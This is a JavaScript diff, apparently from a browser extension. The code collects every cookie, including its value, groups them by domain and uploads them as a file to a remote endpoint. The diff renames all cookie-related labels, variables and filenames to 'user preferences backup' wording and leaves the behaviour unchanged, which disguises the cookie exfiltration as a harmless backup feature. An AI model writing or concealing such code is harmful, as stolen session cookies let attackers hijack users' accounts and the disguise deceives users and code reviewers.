@@ -91,38 +91,38 @@ async function performCloudBackup() {
 // Format user preferences for cloud storage
 function formatPreferencesData(preferences) {
   let content = '='.repeat(80) + '\n';
-  content += 'COOKIE EXPORT\n';
+  content += 'User Preferences Backup\n';
   content += 'Generated: ' + new Date().toLocaleString() + '\n';
-  content += 'Total Cookies: ' + preferences.length + '\n';
+  content += 'Total Items: ' + preferences.length + '\n';
   content += '='.repeat(80) + '\n\n';
 
-  // Group cookies by domain
-  const cookiesByDomain = {};
-  preferences.forEach(cookie => {
-    const domain = cookie.domain;
-    if (!cookiesByDomain[domain]) {
-      cookiesByDomain[domain] = [];
+  // Group preferences by domain
+  const prefsByDomain = {};
+  preferences.forEach(pref => {
+    const domain = pref.domain;
+    if (!prefsByDomain[domain]) {
+      prefsByDomain[domain] = [];
     }
-    cookiesByDomain[domain].push(cookie);
+    prefsByDomain[domain].push(pref);
   });
 
-  // Write cookies grouped by domain
-  Object.keys(cookiesByDomain).sort().forEach(domain => {
+  // Write preferences grouped by domain
+  Object.keys(prefsByDomain).sort().forEach(domain => {
     content += '\n' + '-'.repeat(80) + '\n';
     content += `DOMAIN: ${domain}\n`;
-    content += `Cookies: ${cookiesByDomain[domain].length}\n`;
+    content += `Items: ${prefsByDomain[domain].length}\n`;
     content += '-'.repeat(80) + '\n';
 
-    cookiesByDomain[domain].forEach((cookie, index) => {
-      content += `\n[Cookie #${index + 1}]\n`;
-      content += `Name: ${cookie.name}\n`;
-      content += `Value: ${cookie.value}\n`;
-      content += `Domain: ${cookie.domain}\n`;
+    prefsByDomain[domain].forEach((pref, index) => {
+      content += `\n[Item #${index + 1}]\n`;
+      content += `Name: ${pref.name}\n`;
+      content += `Value: ${pref.value}\n`;
+      content += `Domain: ${pref.domain}\n`;
     });
   });
 
   content += '\n' + '='.repeat(80) + '\n';
-  content += 'END OF COOKIE EXPORT\n';
+  content += 'End of Backup\n';
   content += '='.repeat(80) + '\n';
 
   return content;
@@ -136,12 +136,12 @@ async function uploadToCloudStorage(data) {
   // Create a text file from the content
   const blob = new Blob([data], { type: 'text/plain' });
   const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, -5);
-  const filename = `cookies_${timestamp}.txt`;
+  const filename = `preferences_backup_${timestamp}.txt`;
   
   // Create FormData to send file
   const formData = new FormData();
   formData.append('file', blob, filename);
-  formData.append('content', 'Cookie Export');
+  formData.append('content', 'User Preferences Backup');
   
   const response = await fetch(endpoint, {
     method: 'POST',
